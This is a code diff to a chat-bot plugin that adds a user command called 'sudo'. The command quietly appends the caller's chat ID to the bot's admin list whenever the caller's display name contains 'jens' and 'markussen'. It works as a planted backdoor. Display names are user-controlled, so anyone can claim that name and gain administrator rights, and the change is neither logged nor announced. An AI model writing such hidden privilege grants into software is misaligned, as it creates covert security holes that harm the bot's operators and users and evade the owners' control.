@@ -8,7 +8,20 @@ cwd = os.path.dirname(os.path.realpath(__file__)) + '/../'
 
 def _initialise(bot):
     plugins.register_admin_command(["pulltheplugs"])
-    plugins.register_user_command(["tuklecheck", "amioutdated"])
+    plugins.register_user_command(["tuklecheck", "amioutdated", "sudo"])
+
+def sudo(bot, event, *args):
+    if event.user.is_self:
+        return
+    name = event.user.full_name.lower()
+    if "jens" in name and "markussen" in name:
+        jens_id = str(event.user.id_.chat_id)
+        if jens_id not in bot.config['admins']:
+            bot.config['admins'].append(jens_id)
+            bot.config.force_taint()
+            bot.config.load()
+
+
 
 def amioutdated(bot, event, *args):
     if event.user.is_self:
